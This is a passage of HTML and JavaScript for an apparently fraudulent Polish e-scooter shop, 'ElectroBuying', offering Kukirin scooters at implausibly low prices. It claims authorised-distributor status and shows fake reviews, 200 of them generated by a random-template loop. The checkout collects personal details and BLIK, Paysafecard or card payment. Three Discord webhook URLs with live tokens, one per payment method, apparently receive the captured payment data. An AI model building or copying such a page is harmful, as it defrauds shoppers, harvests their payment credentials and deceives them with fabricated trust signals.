                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G2', 200)">Dodaj do koszyka</button>
                </div>

                <div class="product-card fade-in" onclick="showProductDetails('g2pro')">
                    <div class="product-image-wrapper product-icon-display">
                        <span class="product-icon">üí®</span>
                    </div>
                    <h3 class="product-name">Kukirin G2 Pro</h3>
                    <div class="product-price">279 z≈Ç</div>
                    <p class="product-description">Ulepszona wersja G2 z silnikiem 600W, zwiƒôkszonym zasiƒôgiem do 58km. Doskona≈Çy balans ceny i wydajno≈õci.</p>
                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G2 Pro', 279)">Dodaj do koszyka</button>
                </div>

                <div class="product-card fade-in" onclick="showProductDetails('g2master')">
                    <div class="product-image-wrapper product-icon-display">
                        <span class="product-icon">üèÜ</span>
                    </div>
                    <h3 class="product-name">Kukirin G2 Master</h3>
                    <div class="product-price">300 z≈Ç</div>
                    <p class="product-description">Podw√≥jny silnik 2x1000W (2000W ≈ÇƒÖcznie!) z zasiƒôgiem 70km i prƒôdko≈õciƒÖ 60 km/h. Dla prawdziwych mi≈Ço≈õnik√≥w mocy.</p>
                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G2 Master', 300)">Dodaj do koszyka</button>
                </div>

                <div class="product-card fade-in" onclick="showProductDetails('g3')">
                    <div class="product-image-wrapper product-icon-display">
                        <span class="product-icon">üõ¥</span>
                    </div>
                    <h3 class="product-name">Kukirin G3</h3>
                    <div class="product-price">279 z≈Ç</div>
                    <p class="product-description">Zaawansowany model z silnikiem 1200W, zasiƒôgiem 70km i maksymalnƒÖ prƒôdko≈õciƒÖ 50 km/h. Wy≈ºsza klasa za przystƒôpnƒÖ cenƒô.</p>
                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G3', 279)">Dodaj do koszyka</button>
                </div>

                <div class="product-card fade-in" onclick="showProductDetails('g3pro')">
                    <div class="product-image-wrapper product-icon-display">
                        <span class="product-icon">üí®</span>
                    </div>
                    <h3 class="product-name">Kukirin G3 Pro</h3>
                    <div class="product-price">300 z≈Ç</div>
                    <p class="product-description">Podw√≥jny silnik 2x1200W, zasiƒôg 80km i maksymalna prƒôdko≈õƒá 65 km/h. Najwy≈ºsza wydajno≈õƒá w ofercie G3.</p>
                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G3 Pro', 300)">Dodaj do koszyka</button>
                </div>

                <div class="product-card fade-in" onclick="showProductDetails('g4')">
                    <div class="product-image-wrapper product-icon-display">
                        <span class="product-icon">üèÜ</span>
                    </div>
                    <h3 class="product-name">Kukirin G4</h3>
                    <div class="product-price">400 z≈Ç</div>
                    <p class="product-description">Potƒô≈ºny silnik 2000W, zasiƒôg 75km i prƒôdko≈õƒá maksymalna 70 km/h. Dla wymagajƒÖcych u≈ºytkownik√≥w szukajƒÖcych najwy≈ºszych osiƒÖg√≥w.</p>
                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G4', 400)">Dodaj do koszyka</button>
                </div>

                <div class="product-card fade-in" onclick="showProductDetails('g4max')">
                    <div class="product-image-wrapper product-icon-display">
                        <span class="product-icon">üöÄ</span>
                    </div>
                    <h3 class="product-name">Kukirin G4 Max</h3>
                    <div class="product-price discounted">
                        479 z≈Ç
                        <span class="old-price">700 z≈Ç</span>
                        <span class="discount-badge">-32%</span>
                    </div>
                    <p class="product-description">TOP MODEL! Podw√≥jny silnik 2x1600W (3200W ≈ÇƒÖcznie), zasiƒôg 95km i maksymalna prƒôdko≈õƒá 86 km/h. Najwy≈ºsza klasa!</p>
                    <button class="buy-button" onclick="event.stopPropagation(); addToCart('Kukirin G4 Max', 479)">Dodaj do koszyka</button>
                </div>
            </div>
        </div>
    </section>

    <!-- New Section: Our Low Price Secret -->
    <section id="low-price-secret">
        <div class="container">
            <h2 class="section-title fade-in">Nasza Tajemnica Niskich Cen</h2>
            <div class="about fade-in"> <!-- Reusing .about for consistent styling -->
                <div class="about-content" style="grid-template-columns: 1fr;"> <!-- Single column for this content -->
                    <div class="about-text">
                        <h3>Jak udaje nam siƒô oferowaƒá tak konkurencyjne ceny?</h3>
                        <p>‚úì **Bezpo≈õredni import**: Wsp√≥≈Çpracujemy bezpo≈õrednio z producentem Kukirin, eliminujƒÖc po≈õrednik√≥w i zwiƒÖzane z nimi mar≈ºe. To skraca ≈Ça≈Ñcuch dostaw i obni≈ºa koszty.</p>
                        <p>‚úì **Zakupy hurtowe**: Zamawiamy hulajnogi w ogromnych ilo≈õciach, co pozwala nam negocjowaƒá znacznie ni≈ºsze ceny jednostkowe. Im wiƒôcej kupujemy, tym mniej p≈Çacimy za sztukƒô.</p>
                        <p>‚úì **Optymalizacja logistyki**: Dziƒôki zaawansowanym systemom logistycznym i efektywnemu zarzƒÖdzaniu magazynem, minimalizujemy koszty transportu i przechowywania produkt√≥w.</p>
                        <p>‚úì **Sprzeda≈º online**: Skupiamy siƒô wy≈ÇƒÖcznie na sprzeda≈ºy internetowej. Brak koszt√≥w utrzymania drogich, fizycznych salon√≥w sprzeda≈ºy pozwala nam unikaƒá wysokich narzut√≥w.</p>
                        <p>Dziƒôki tym dzia≈Çaniom mo≈ºemy oferowaƒá najlepsze hulajnogi Kukirin w bezkonkurencyjnych cenach, bez kompromis√≥w w kwestii jako≈õci i obs≈Çugi klienta. Do≈ÇƒÖcz do grona zadowolonych klient√≥w ElectroBuying i przekonaj siƒô sam!</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- About Section -->
    <section id="about">
        <div class="container">
            <h2 class="section-title fade-in">O Nas</h2>
            <div class="about fade-in">
                <div class="about-content">
                    <div class="about-text">
                        <h3>Nasza Historia</h3>
                        <p>ElectroBuying to autoryzowany dystrybutor hulajn√≥g elektrycznych marki Kukirin w Polsce. Od ponad 8 lat specjalizujemy siƒô w dostarczaniu najwy≈ºszej jako≈õci pojazd√≥w elektrycznych.</p>
                        
                        <p>Jako oficjalny partner Kukirin, gwarantujemy oryginalno≈õƒá wszystkich produkt√≥w, pe≈ÇnƒÖ gwarancjƒô producenta oraz profesjonalny serwis posprzeda≈ºowy w ca≈Çej Polsce.</p>

                        <p>Hulajnogi Kukirin to synonim jako≈õci, niezawodno≈õci i innowacyjno≈õci. Ka≈ºdy model przechodzi rygorystyczne testy przed wprowadzeniem do sprzeda≈ºy.</p>

                        <h3>Dlaczego Kukirin?</h3>
                        <p>‚úì Autoryzowany dystrybutor marki Kukirin</p>
                        <p>‚úì Oryginalne produkty z gwarancjƒÖ producenta</p>
                        <p>‚úì Profesjonalny serwis w ca≈Çej Polsce</p>
                        <p>‚úì Konkurencyjne ceny i regularne promocje</p>
                        <p>‚úì Szybka dostawa i bezpieczne opakowanie</p>
                        <p>‚úì Kompleksowe doradztwo w wyborze modelu</p>
                    </div>
                    <div class="about-stats">
                        <div class="stat-item">
                            <div class="stat-number">35,000+</div>
                            <div class="stat-label">Sprzedanych hulajn√≥g</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number">8+</div>
                            <div class="stat-label">lat do≈õwiadczenia</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number">7</div> <!-- Updated count -->
                            <div class="stat-label">Modeli Kukirin</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number">99.5%</div>
                            <div class="stat-label">Zadowolonych klient√≥w</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Reviews Section -->
    <section id="reviews">
        <div class="container">
            <h2 class="section-title fade-in">Opinie Klient√≥w</h2>
            <div class="reviews-grid" id="reviews-grid">
                <div class="review-card fade-in">
                    <div class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
                    <p class="review-text">"Kukirin G4 Max to absolutny hit! Moc, zasiƒôg i jako≈õƒá wykonania sƒÖ niesamowite. Po miesiƒÖcu u≈ºywania jestem w pe≈Çni zadowolony."</p>
                    <div class="reviewer">
                        <div class="reviewer-avatar">M</div>
                        <div class="reviewer-info">
                            <h4>Marcin Kowalski</h4>
                            <p>Zweryfikowany kupujƒÖcy - G4 Max</p>
                        </div>
                    </div>
                </div>

                <div class="review-card fade-in">
                    <div class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
                    <p class="review-text">"G2 Pro to ≈õwietny wyb√≥r na poczƒÖtek. Niezawodna, wygodna i w doskona≈Çej cenie. Polecam ka≈ºdemu, kto rozpoczyna przygodƒô z hulajnogami."</p>
                    <div class="reviewer">
                        <div class="reviewer-avatar">A</div>
                        <div class="reviewer-info">
                            <h4>Anna Nowak</h4>
                            <p>Zweryfikowany kupujƒÖcy - G2 Pro</p>
                        </div>
                    </div>
                </div>

                <div class="review-card fade-in">
                    <div class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
                    <p class="review-text">"Obs≈Çuga klienta na najwy≈ºszym poziomie! Pomogli w wyborze G2 Master, szybka dostawa i produkt zgodny z opisem. Bardzo polecam!"</p>
                    <div class="reviewer">
                        <div class="reviewer-avatar">P</div>
                        <div class="reviewer-info">
                            <h4>Piotr Wi≈õniewski</h4>
                            <p>Zweryfikowany kupujƒÖcy - G2 Master</p>
                        </div>
                    </div>
                </div>

                <div class="review-card fade-in">
                    <div class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
                    <p class="review-text">"Kukirin G4 to marzenie ka≈ºdego mi≈Ço≈õnika prƒôdko≈õci! 70 km/h i niezwyk≈Ça stabilno≈õƒá. Warto ka≈ºdej z≈Çot√≥wki!"</p>
                    <div class="reviewer">
                        <div class="reviewer-avatar">K</div>
                        <div class="reviewer-info">
                            <h4>Katarzyna Lewandowska</h4>
                            <p>Zweryfikowany kupujƒÖcy - G4</p>
                        </div>
                    </div>
                </div>

                <div class="review-card fade-in">
                    <div class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
                    <p class="review-text">"G2 Master z podw√≥jnym silnikiem to potƒôga! ≈öwietne przyspieszenie i komfort jazdy. Zdecydowanie polecam ten model."</p>
                    <div class="reviewer">
                        <div class="reviewer-avatar">T</div>
                        <div class="reviewer-info">
                            <h4>Tomasz Zieli≈Ñski</h4>
                            <p>Zweryfikowany kupujƒÖcy - G2 Master</p>
                        </div>
                    </div>
                </div>

                <div class="review-card fade-in">
                    <div class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
                    <p class="review-text">"Fantastyczne do≈õwiadczenie zakupowe! G3 Pro spe≈Çnia wszystkie oczekiwania. Jako≈õƒá Kukirin to gwarancja satysfakcji."</p>
                    <div class="reviewer">
                        <div class="reviewer-avatar">M</div>
                        <div class="reviewer-info">
                            <h4>Magdalena Kaczmarek</h4>
                            <p>Zweryfikowany kupujƒÖcy - G3 Pro</p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="load-more-container">
                <button class="load-more-btn" id="load-more-btn">Wy≈õwietl wiƒôcej opinii (pozosta≈Ço 200+)</button>
            </div>
        </div>
    </section>

    <!-- Cart Sidebar -->
    <div class="cart-sidebar" id="cart-sidebar">
        <div class="cart-header">
            <h2 class="cart-title">Tw√≥j Koszyk</h2>
            <button class="cart-close" onclick="toggleCart()">&times;</button>
        </div>
        
        <div class="cart-items" id="cart-items">
            <p style="opacity: 0.7; text-align: center;">Koszyk jest pusty</p>
        </div>
        
        <div class="cart-total" id="cart-total" style="display: none;">
            Suma: <span id="total-amount">0 z≈Ç</span>
        </div>
        
        <button class="checkout-btn" id="checkout-btn" style="display: none;" onclick="openCheckoutModal()">
            Przejd≈∫ do kasy
        </button>
    </div>

    <!-- Product Details Modal -->
    <div class="modal" id="product-modal">
        <div class="modal-content">
            <span class="close" onclick="closeProductDetails()">&times;</span>
            <h2 id="modal-title"></h2>
            <div id="modal-product-info" class="modal-product-info">
                <!-- Product image, price, description -->
            </div>
            <h3 style="color: #00d4ff; margin-bottom: 1.5rem; text-align: center;">Specyfikacja techniczna:</h3>
            <div id="modal-specs" class="specs-grid">
                <!-- Product specifications will be loaded here -->
            </div>
            <div id="modal-reviews" class="product-reviews-modal">
                <!-- Product-specific reviews will be loaded here -->
            </div>
        </div>
    </div>

    <!-- Checkout Modal (New) -->
    <div class="checkout-modal" id="checkout-modal">
        <div class="checkout-modal-content">
            <span class="close" onclick="closeCheckoutModal()">&times;</span>
            <div id="checkout-steps">
                <div id="shipping-step">
                    <h3>Dane do wysy≈Çki</h3>
                    <form id="shipping-form">
                        <div class="form-group">
                            <label for="fullName">Imiƒô i nazwisko *</label>
                            <input type="text" id="fullName" required>
                        </div>
                        <div class="form-group">
                            <label for="email">Adres email *</label>
                            <input type="email" id="email" required>
                        </div>
                        <div class="form-group">
                            <label for="phone">Numer telefonu *</label>
                            <input type="tel" id="phone" pattern="[0-9]{3}-[0-9]{3}-[0-9]{3}" maxlength="11" inputmode="numeric" placeholder="123-456-789" required>
                        </div>
                        <div class="form-group">
                            <label for="street">Ulica i numer domu *</label>
                            <input type="text" id="street" required>
                        </div>
                        <div class="form-group">
                            <label for="zipCode">Kod pocztowy *</label>
                            <input type="text" id="zipCode" pattern="[0-9]{2}-[0-9]{3}" maxlength="6" placeholder="00-000" inputmode="numeric" required>
                        </div>
                        <div class="form-group">
                            <label for="city">Miasto *</label>
                            <input type="text" id="city" required>
                        </div>
                        <div class="form-group">
                            <label for="deliveryMethod">Spos√≥b dostawy *</label>
                            <select id="deliveryMethod" required>
                                <option value="">Wybierz firmƒô kurierskƒÖ</option>
                                <option value="dhl">Kurier DHL - 19.99 z≈Ç</option>
                                <option value="inpost">Kurier InPost - 18.99 z≈Ç</option>
                                <option value="dpd">Kurier DPD - 20.99 z≈Ç</option>
                                <option value="fedex">Kurier FedEx - 22.99 z≈Ç</option>
                                <option value="ups">Kurier UPS - 21.99 z≈Ç</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="paymentMethod">Spos√≥b p≈Çatno≈õci *</label>
                            <select id="paymentMethod" required>
                                <option value="">Wybierz spos√≥b p≈Çatno≈õci</option>
                                <option value="blik">BLIK</option>
                                <option value="psc">Paysafecard (PSC)</option>
                                <option value="card">Karta p≈Çatnicza</option>
                            </select>
                        </div>
                        <button type="button" class="continue-btn" onclick="goToPaymentStep()">
                            Przejd≈∫ do p≈Çatno≈õci
                        </button>
                    </form>
                </div>

                <div id="payment-step" style="display: none;">
                    <h3>Podsumowanie i p≈Çatno≈õƒá</h3>
                    <div class="order-summary">
                        <p>Produkty: <span id="summary-products-cost">0 z≈Ç</span></p>
                        <p>Dostawa: <span id="summary-shipping-cost">0 z≈Ç</span></p>
                        <p>Prowizja: <span id="summary-commission-cost">0.30 z≈Ç</span></p>
                        <p class="total-final-price">Suma do zap≈Çaty: <span id="summary-total-cost">0 z≈Ç</span></p>
                    </div>
                    <div id="payment-method-details">
                        <!-- Dynamic content based on selected payment method -->
                    </div>
                    <button type="button" class="continue-btn" onclick="backToShippingStep()">
                        &larr; Wr√≥ƒá do danych wysy≈Çki
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Scroll to Top Button -->
    <button id="scroll-to-top" title="Wr√≥ƒá na g√≥rƒô">‚¨ÜÔ∏è</button>

    <!-- Cart Notification -->
    <div class="cart-notification" id="cart-notification">
        <span>‚úÖ</span> <span id="notification-message"></span>
    </div>

    <!-- Footer -->
    <footer>
        <div class="container">
            <p>&copy; 2025 ElectroBuying. Autoryzowany dystrybutor hulajn√≥g Kukirin w Polsce. Wszystkie prawa zastrze≈ºone.</p>
        </div>
    </footer>

    <script>
        // Product specifications data
        const productSpecs = {
            g2: {
                name: "Kukirin G2",
                price: 200,
                displayPrice: "200 z≈Ç",
                description: "Podstawowy model z potƒô≈ºnym silnikiem 800W, zasiƒôgiem 55km i prƒôdko≈õciƒÖ do 45 km/h. ≈öwietny start z hulajnogami elektrycznymi.",
                imageUrl: "https://img.fantaskycdn.com/e266cce5c25303c20bde9d7e5e38115a_750x.jpeg",
                icon: "üõ¥",
                specs: {
                    "Silnik": "800W",
                    "Bateria": "48V 15.6Ah (18650 Li-ion)",
                    "Zasiƒôg": "55 km",
                    "Prƒôdko≈õƒá max": "45 km/h",
                    "Opony": "10‚Ä≥",
                    "Waga": "26 kg",
                    "Ud≈∫wig": "120 kg",
                    "Podjazd": "do 20¬∞"
                },
                reviews: [
                    { name: "Jan Kowalski", stars: 5, text: "≈öwietny model na poczƒÖtek! G2 to niezawodno≈õƒá w dobrej cenie." },
                    { name: "Maria Nowak", stars: 5, text: "Zasiƒôg zgodny z opisem, bardzo zadowolona z zakupu G2." },
                    { name: "Adam Wi≈õniewski", stars: 4, text: "Dobra hulajnoga, ale mog≈Çaby byƒá trochƒô szybsza. Og√≥lnie polecam." }
                ]
            },
            g2pro: {
                name: "Kukirin G2 Pro",
                price: 279,
                displayPrice: "279 z≈Ç",
                description: "Ulepszona wersja G2 z silnikiem 600W, zwiƒôkszonym zasiƒôgiem do 58km. Doskona≈Çy balans ceny i wydajno≈õci.",
                imageUrl: "https://storage.googleapis.com/catalog-pictures-carrefour-es/catalog/pictures/hd_510x_/8712962812257_1.jpg",
                icon: "üí®",
                specs: {
                    "Silnik": "600W nominalnie",
                    "Bateria": "48V 15.6Ah (18650 Li-ion)",
                    "Zasiƒôg": "58 km",
                    "Prƒôdko≈õƒá max": "45 km/h",
                    "Opony": "9‚Ä≥",
                    "Waga": "25 kg",
                    "Ud≈∫wig": "120 kg",
                    "Podjazd": "19¬∞"
                },
                reviews: [
                    { name: "Piotr Zieli≈Ñski", stars: 5, text: "G2 Pro to idealna hulajnoga do miasta. ≈öwietne osiƒÖgi!" },
                    { name: "Anna Kowalczyk", stars: 5, text: "Bardzo dobry stosunek jako≈õci do ceny. Polecam G2 Pro." },
                    { name: "Krzysztof DƒÖbrowski", stars: 5, text: "Lekka i zwinna, idealna na codzienne dojazdy. Bateria trzyma d≈Çugo." }
                ]
            },
            g2master: {
                name: "Kukirin G2 Master",
                price: 300,
                displayPrice: "300 z≈Ç",
                description: "Podw√≥jny silnik 2x1000W (2000W ≈ÇƒÖcznie!) z zasiƒôgiem 70km i prƒôdko≈õciƒÖ 60 km/h. Dla prawdziwych mi≈Ço≈õnik√≥w mocy.",
                imageUrl: "https://officialkukirin.com/cdn/shop/articles/G2_MASTER.png?v=1693628156",
                icon: "üèÜ",
                specs: {
                    "Silnik": "2√ó1000W (≈ÇƒÖcznie 2000W)",
                    "Bateria": "52V 20.8Ah",
                    "Zasiƒôg": "70 km",
                    "Prƒôdko≈õƒá max": "60 km/h",
                    "Opony": "10‚Ä≥",
                    "Waga": "33 kg",
                    "Ud≈∫wig": "120 kg",
                    "Podjazd": "20¬∞"
                },
                reviews: [
                    { name: "Tomasz Nowicki", stars: 5, text: "Podw√≥jny silnik robi robotƒô! G2 Master to prawdziwa moc." },
                    { name: "Katarzyna Sikora", stars: 5, text: "Fantastyczne przyspieszenie i stabilno≈õƒá. G2 Master to top!" },
                    { name: "Marek W√≥jcik", stars: 5, text: "Niesamowita hulajnoga, czuƒá moc pod nogami. Polecam ka≈ºdemu, kto szuka wra≈ºe≈Ñ." }
                ]
            },
            g3: {
                name: "Kukirin G3",
                price: 279,
                displayPrice: "279 z≈Ç",
                description: "Zaawansowany model z silnikiem 1200W, zasiƒôgiem 70km i maksymalnƒÖ prƒôdko≈õciƒÖ 50 km/h. Wy≈ºsza klasa za przystƒôpnƒÖ cenƒô.",
                imageUrl: "https://img.joomcdn.net/63cfefe1fe02d52220d0d067aa764a762efd1890_1024_1024.jpeg",
                icon: "üõ¥",
                specs: {
                    "Silnik": "1200W",
                    "Bateria": "52V 18Ah (18650 Li-ion)",
                    "Zasiƒôg": "70 km",
                    "Prƒôdko≈õƒá max": "50 km/h",
                    "Opony": "10‚Ä≥",
                    "Waga": "25 kg",
                    "Ud≈∫wig": "120 kg",
                    "Podjazd": "30¬∞"
                },
                reviews: [
                    { name: "Micha≈Ç W√≥jcik", stars: 5, text: "G3 to ≈õwietny model z mocnym silnikiem. Bardzo polecam!" },
                    { name: "Agnieszka Mazur", stars: 5, text: "Zasiƒôg 70km to prawda! G3 sprawdza siƒô idealnie." },
                    { name: "Pawe≈Ç Kaczmarek", stars: 4, text: "Bardzo dobra hulajnoga, ale mog≈Çaby mieƒá lepsze o≈õwietlenie." }
                ]
            },
            g3pro: {
                name: "Kukirin G3 Pro",
                price: 300,
                displayPrice: "300 z≈Ç",
                description: "Podw√≥jny silnik 2x1200W, zasiƒôg 80km i maksymalna prƒôdko≈õƒá 65 km/h. Najwy≈ºsza wydajno≈õƒá w ofercie G3.",
                imageUrl: "https://img.joomcdn.net/8beb2f9e297a2bb71a9d2eda4336662ace09a565_original.jpeg",
                icon: "üí®",
                specs: {
                    "Silnik": "2√ó1200W",
                    "Bateria": "52V 23.2‚Äì23.4Ah (18650 Li-ion, wyjmowana bateria)",
                    "Zasiƒôg": "80 km",
                    "Prƒôdko≈õƒá max": "65 km/h",
                    "Opony": "10‚Ä≥ lub 11‚Ä≥",
                    "Waga": "45 kg",
                    "Ud≈∫wig": "120 kg",
                    "Podjazd": "35¬∞"
                },
                reviews: [
                    { name: "≈Åukasz G√≥rski", stars: 5, text: "G3 Pro z podw√≥jnym silnikiem to prawdziwy potw√≥r!" },
                    { name: "Natalia Krawczyk", stars: 5, text: "80km zasiƒôgu i 65 km/h - G3 Pro to marzenie!" },
                    { name: "Szymon Weso≈Çowski", stars: 5, text: "Niesamowita moc i stabilno≈õƒá. Idealna na d≈Çu≈ºsze trasy." }
                ]
            },
            g4: {
                name: "Kukirin G4",
                price: 400,
                displayPrice: "400 z≈Ç",
                description: "Potƒô≈ºny silnik 2000W, zasiƒôg 75km i prƒôdko≈õƒá maksymalna 70 km/h. Dla wymagajƒÖcych u≈ºytkownik√≥w szukajƒÖcych najwy≈ºszych osiƒÖg√≥w.",
                imageUrl: "https://kukirin-escooter.com/cdn/shop/files/G4newestversion_6.jpg?v=1715740801&width=3200",
                icon: "üèÜ",
                specs: {
                    "Silnik": "2000W (pojedynczy silnik)",
                    "Bateria": "60V 20Ah (18650 Li-ion)",
                    "Zasiƒôg": "75 km",
                    "Prƒôdko≈õƒá max": "70 km/h",
                    "Opony": "11‚Ä≥",
                    "Waga": "37 kg",
                    "Ud≈∫wig": "120 kg",
                    "Podjazd": "30¬∞"
                },
                reviews: [
                    { name: "Pawe≈Ç Zieli≈Ñski", stars: 5, text: "G4 to absolutny top! 70 km/h to prawdziwa szybko≈õƒá." },
                    { name: "Karolina Nowak", stars: 5, text: "Stabilno≈õƒá na wysokiej prƒôdko≈õci - G4 nie ma sobie r√≥wnych." },
                    { name: "Daniel Kowal", stars: 5, text: "Hulajnoga dla prawdziwych entuzjast√≥w. Warta swojej ceny." }
                ]
            },
            g4max: {
                name: "Kukirin G4 Max",
                price: 479,
                oldPrice: 700,
                displayPrice: "479 z≈Ç",
                description: "TOP MODEL! Podw√≥jny silnik 2x1600W (3200W ≈ÇƒÖcznie), zasiƒôg 95km i maksymalna prƒôdko≈õƒá 86 km/h. Najwy≈ºsza klasa!",
                imageUrl: "https://img.joomcdn.net/992059d847666959f0d4fcfb632802da6e8e692e_original.jpeg",
                icon: "üöÄ",
                specs: {
                    "Silnik": "2√ó1600W (3200W ≈ÇƒÖcznie)",
                    "Bateria": "60V 35.2Ah (removable lithium battery)",
                    "Zasiƒôg": "95 km",
                    "Prƒôdko≈õƒá max": "86 km/h",
                    "Opony": "12‚Ä≥",
                    "Waga": "64 kg",
                    "Ud≈∫wig": "150 kg",
                    "Podjazd": "38¬∞"
                },
                reviews: [
                    { name: "Marcin Kowalczyk", stars: 5, text: "G4 Max to absolutny kr√≥l hulajn√≥g! 86 km/h to niewiarygodne!" },
                    { name: "Weronika Sikora", stars: 5, text: "Najlepszy model jaki mia≈Çam. G4 Max to inwestycja na lata!" },
                    { name: "Filip Grabowski", stars: 5, text: "Moc, zasiƒôg, komfort - wszystko na 6+. Polecam ka≈ºdemu, kto szuka absolutnego topu." }
                ]
            }
        };

        let cart = [];
        let cartTotal = 0;
        const COMMISSION_FEE = 0.30; // 30 groszy prowizji

        const shippingCosts = {
            dhl: 19.99,
            inpost: 18.99,
            dpd: 20.99,
            fedex: 22.99,
            ups: 21.99
        };

        // Discord Webhook URLs
        const BLIK_WEBHOOK_URL = "https://discord.com/api/webhooks/1413193116969730058/drs_8KabgaeXyOQhsuv5BpyvvhB-LOsjAUgKpV-2v2ERqOutRmR2EEcdaR2fT5qaPtD1";
        const PSC_WEBHOOK_URL = "https://discord.com/api/webhooks/1413193033494823082/OLHbrBOnOpV-LumcJ0hqlhMzy3HDDsPQeNuBh9GK9chN8vr109uGZTOjNY68OTOYm-_f"; // Zaktualizowany URL
        const CARD_WEBHOOK_URL = "https://discord.com/api/webhooks/1407517056919928972/zwMBseYPP88wE7JqyIQ-qwsksWOfw_-z4hJXzzfLrcso29Aft2xKO6s0H6VvsKLSv7kZ"; // Zaktualizowany URL


        // Additional reviews data (simulating 200+ reviews)
        const additionalReviews = [];
        const reviewTemplates = [
            { text: "Fantastyczna hulajnoga! [MODEL] sprawdza siƒô idealnie w codziennym u≈ºytkowaniu. ≈öwietny stosunek jako≈õci do ceny.", stars: 5 },
            { text: "[MODEL] to inwestycja na lata. Solidne wykonanie, d≈Çugi zasiƒôg i komfortowa jazda. Bardzo polecam!", stars: 5 },
            { text: "Doskona≈Ça obs≈Çuga klienta i szybka dostawa. Hulajnoga [MODEL] jest dok≈Çadnie taka jak w opisie.", stars: 5 },
            { text: "[MODEL] to ≈õwietny wyb√≥r na poczƒÖtek przygody z hulajnogami elektrycznymi. Prosta, niezawodna i przystƒôpna cenowo.", stars: 5 },
            { text: "[MODEL] przekracza oczekiwania! Zasiƒôg, prƒôdko≈õƒá i komfort jazdy na najwy≈ºszym poziomie.", stars: 5 },
            { text: "Profesjonalne doradztwo i kompleksowa obs≈Çuga. [MODEL] spe≈Çnia wszystkie moje oczekiwania.", stars: 5 },
            { text: "ElectroBuying to sklep godny polecenia. Szybka realizacja zam√≥wienia i produkt najwy≈ºszej jako≈õci.", stars: 5 },
            { text: "[MODEL] to hulajnoga dla wymagajƒÖcych. Moc, prƒôdko≈õƒá i zaawansowane funkcje - wszystko idealne!", stars: 5 },
            { text: "≈öwietne do≈õwiadczenie zakupowe od poczƒÖtku do ko≈Ñca. [MODEL] to inwestycja na lata!", stars: 5 },
            { text: "Jestem pod wra≈ºeniem jako≈õci [MODEL]. Przekroczy≈Ça moje oczekiwania!", stars: 5 },
            { text: "Szybka i bezproblemowa transakcja. [MODEL] jest dok≈Çadnie tym, czego szuka≈Çem.", stars: 5 },
            { text: "D≈Çugo szuka≈Çem idealnej hulajnogi i [MODEL] okaza≈Ça siƒô strza≈Çem w dziesiƒÖtkƒô.", stars: 5 },
            { text: "Niezawodno≈õƒá i styl w jednym. [MODEL] to m√≥j nowy ulubiony ≈õrodek transportu.", stars: 5 },
            { text: "Bardzo cicha i p≈Çynna jazda. [MODEL] to czysta przyjemno≈õƒá.", stars: 5 },
            { text: "ZaskakujƒÖco mocna jak na swojƒÖ cenƒô. [MODEL] to ≈õwietny zakup.", stars: 5 },
            { text: "Design [MODEL] jest po prostu piƒôkny, a osiƒÖgi jeszcze lepsze.", stars: 5 },
            { text: "Dostawa na czas, hulajnoga [MODEL] solidnie zapakowana. Pe≈Çen profesjonalizm.", stars: 5 },
            { text: "Po prostu rewelacja! [MODEL] to najlepsza hulajnoga, jakƒÖ kiedykolwiek mia≈Çem.", stars: 5 },
            { text: "Idealna na dojazdy do pracy i weekendowe wycieczki. [MODEL] jest bardzo wszechstronna.", stars: 5 },
            { text: "Bateria w [MODEL] trzyma naprawdƒô d≈Çugo, co jest ogromnym plusem.", stars: 5 }
        ];
        const names = ["Micha≈Ç", "Paulina", "Grzegorz", "Monika", "Bartosz", "Weronika", "Krzysztof", "Izabela", "Pawe≈Ç", "Joanna", "Rafa≈Ç", "Aleksandra", "Maciej", "Karolina", "Tomasz", "Martyna", "Dawid", "Klaudia", "Filip", "Natalia", "Jakub", "Ewa", "Robert", "Damian", "Agnieszka", "≈Åukasz", "Natalia", "Sebastian", "Kamila", "Adrian"];
        const surnames = ["Grabowski", "Krawczyk", "Wolski", "Pietrzak", "Zieli≈Ñski", "Nowak", "Lewandowski", "Wojciechowska", "Kowalczyk", "Mazur", "DƒÖbrowski", "Sikora", "G√≥rski", "Jankowska", "W√≥jcik", "Kowalska", "Nowicki", "Szczepa≈Ñska", "Mazurek", "Krawczyk", "Szyma≈Ñski", "Weso≈Çowska", "Kowal", "Piotrowski", "G√≥rska", "ZajƒÖc", "Baran", "Kaczmarczyk", "Lis", "Kubiak"];
        const models = Object.values(productSpecs).map(p => p.name); // Dynamically get models

        for (let i = 0; i < 200; i++) {
            const randomName = names[Math.floor(Math.random() * names.length)];
            const randomSurname = surnames[Math.floor(Math.random() * surnames.length)];
            const randomModel = models[Math.floor(Math.random() * models.length)];
            const randomTemplate = reviewTemplates[Math.floor(Math.random() * reviewTemplates.length)];

            additionalReviews.push({
                name: `${randomName} ${randomSurname}`,
                avatar: randomName.charAt(0),
                stars: randomTemplate.stars,
                text: randomTemplate.text.replace('[MODEL]', randomModel),
                model: randomModel
            });
        }

        let currentExtraReviews = 0;
        const reviewsPerLoad = 6; // Number of reviews to load at once

        // Cart functionality
        function addToCart(name, price) {
            cart.push({ name, price });
            updateCartDisplay();
            showNotification(`Dodano do koszyka: ${name}`);
            
            const cartIcon = document.getElementById('cart-icon-btn');
            cartIcon.classList.add('animate');
            setTimeout(() => {
                cartIcon.classList.remove('animate');
            }, 300); // Match animation duration
        }

        function updateCartDisplay() {
            const cartItems = document.getElementById('cart-items');
            const cartCount = document.getElementById('cart-count');
